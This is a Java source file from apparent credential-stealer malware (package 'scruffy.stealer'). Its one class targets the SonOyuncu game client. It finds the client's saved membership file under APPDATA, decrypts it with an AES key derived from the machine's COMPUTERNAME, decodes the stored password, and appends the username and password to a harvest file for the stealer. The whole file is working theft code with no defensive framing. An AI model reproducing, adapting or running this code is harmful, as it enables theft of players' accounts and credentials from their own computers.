package scruffy.stealer.impl.game;

import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

import javax.crypto.Cipher;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

import org.apache.commons.io.FileUtils;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import scruffy.stealer.utils.utilities;

public class sonoyuncu extends utilities {

    public void initialize() throws Exception {
        File path = new File(System.getenv("APPDATA") + "/.sonoyuncu/sonoyuncu-membership.json");
        if (!path.exists())
            return;

        JsonObject decryptedData = getDecryptedJson(path);
        if (decryptedData == null)
            return;

        String username = decryptedData.get("sonOyuncuUsername").getAsString();
        String password = new String(Base64.getDecoder().decode(decryptedData.get("sonOyuncuPassword").getAsString()), StandardCharsets.UTF_8);

        FileUtils.writeStringToFile(new File(getFolder() + "/game/sonoyuncu/acc.txt"), username + ":" + password + "\n", StandardCharsets.UTF_8, true);
        content.add("sonoyuncu");
    }

    private JsonObject getDecryptedJson(File file) throws Exception {
        if (!file.isFile())
            return null;

        DataInputStream dataInputStream = new DataInputStream(new FileInputStream(file));
        if (dataInputStream.read() != 31)
            return null;

        byte[] salt = new byte[8];
        dataInputStream.readFully(salt);

        int encryptedDataLength = dataInputStream.readInt();
        byte[] encryptedData = new byte[encryptedDataLength];
        dataInputStream.readFully(encryptedData);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int bytesRead;

        while ((bytesRead = dataInputStream.read(buffer, 0, buffer.length)) != -1) {
            byteArrayOutputStream.write(buffer, 0, bytesRead);
        }

        SecretKeySpec secretKeySpec = new SecretKeySpec(SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256").generateSecret(new PBEKeySpec(System.getenv("COMPUTERNAME").toCharArray(), salt, 65536, 128)) .getEncoded(), "AES");

        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.DECRYPT_MODE, secretKeySpec, new IvParameterSpec(encryptedData, 0, 16));

        byte[] decryptedData = cipher.doFinal(byteArrayOutputStream.toByteArray());

        return new JsonParser().parse(new String(decryptedData, StandardCharsets.UTF_8)).getAsJsonObject();
    }

}
